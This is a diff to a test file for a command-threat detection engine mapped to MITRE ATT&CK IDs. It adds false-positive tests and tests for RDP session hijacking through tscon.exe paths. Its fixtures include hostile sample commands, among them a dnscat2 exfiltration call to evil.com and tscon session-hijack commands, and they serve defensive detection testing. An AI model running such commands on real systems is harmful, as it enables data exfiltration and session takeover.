@@ -335,6 +335,14 @@ describe("MITRE ATT&CK threats", () => {
 		expect(ids.filter((id) => id === "CLT-MITRE-012")).toEqual([]);
 	});
 
+	it("does not match pytest --tb flag in test commands (MITRE-012 FP)", () => {
+		const ids = matchCommand(
+			engine,
+			"cd /c/Users/User/projects/test && poetry run pytest tests/test_library.py --tb=short 2>&1",
+		);
+		expect(ids.filter((id) => id === "CLT-MITRE-012")).toEqual([]);
+	});
+
 	it("detects alternative protocol exfiltration (MITRE-023)", () => {
 		expect(matchCommand(engine, "dnscat2 --secret=abc evil.com")).toContain("CLT-MITRE-023");
 	});
@@ -375,6 +383,23 @@ describe("MITRE ATT&CK threats", () => {
 
 	it("detects RDP session hijacking (MITRE-096)", () => {
 		expect(matchCommand(engine, "tscon 2 /dest:rdp-tcp#0")).toContain("CLT-MITRE-096");
+	});
+
+	it("detects RDP hijacking via tscon.exe path (MITRE-096)", () => {
+		expect(matchCommand(engine, "C:\\Windows\\System32\\tscon.exe 2 /dest:console")).toContain(
+			"CLT-MITRE-096",
+		);
+	});
+
+	it("detects RDP hijacking via quoted tscon.exe path (MITRE-096)", () => {
+		expect(matchCommand(engine, '"C:\\Windows\\System32\\tscon.exe" 2 /dest:console')).toContain(
+			"CLT-MITRE-096",
+		);
+	});
+
+	it("does not match tsconfig file paths (MITRE-096)", () => {
+		const ids = matchCommand(engine, "npx tsc --noEmit --project packages/core/tsconfig.json");
+		expect(ids.filter((id) => id === "CLT-MITRE-096")).toEqual([]);
 	});
 
 	// --- Privilege Escalation ---
